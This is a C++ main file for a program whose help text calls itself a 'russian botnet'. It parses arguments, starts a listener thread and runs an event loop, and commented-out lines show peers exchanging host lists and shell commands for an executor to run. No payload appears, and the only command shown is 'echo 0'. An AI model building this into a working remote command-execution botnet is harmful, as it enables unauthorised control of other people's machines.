#include "globaltransporter.h"
#include "thread"
#include <iostream>

using namespace std;
std::string printHelp(char * firstArgument){
    std::cout << "russian botnet" << std::endl << "usage: " <<std::string (firstArgument) << " [init|load] [noPing|ping] [local|world]" << std::endl;
}
int main(int argc, char *argv[])
{//std::this_thread::sleep_for(std::chrono::seconds(3));
    if (argc != 4){

        printHelp(argv[0]);
        return 1;
    }

    GlobalTransporter * global;
    bool noPing;
    bool local;
    if (std::string(argv[2]) == "noPing"){
        noPing = true;
    }
    else if(std::string(argv[2]) == "ping"){
        noPing = false;
    }
    else{
        printHelp(argv[0]);
                return 1;
    }


    if (std::string(argv[3]) == "local"){
        local= true;
    }
    else if(std::string(argv[3]) == "world"){
        local = false;
    }
    else{
        printHelp(argv[0]);
                return 1;
    }
    global = new GlobalTransporter(!noPing, local);


    if (std::string(argv[1]) == "load"){
        global->load();
    }
    else if (std::string(argv[1]) == "init"){
        global->init();
    }
    else{
        printHelp(argv[0]);
        delete global;
        return 1;
    }
        /*
    global->load();
    //std::this_thread::sleep_for(std::chrono::seconds(3));
    global->save();*/
    std::thread * thread = new std::thread(&GlobalTransporter::startListening,global);
    //     //global->startListening();
    cout << endl << "EVENT LOOP START!" << endl << endl;
    global->eventLoop();
    // //global->accept("updateResponse{hostList{<host>192.168.0.11:3456</host>\n<host>192.168.0.13:3312</host>\n}hostListcommands{<command><id>12</id>echo 0</command>}commands}updateResponse");
    // cout << "end" << endl;


    // Executor exec(time(0));
    // exec.startExecute("echo 0", 32);
    // std::this_thread::sleep_for(std::chrono::seconds(5));
    // std::cout << "Executed - " << exec.getFirstExecutedId();


    return 0;
}
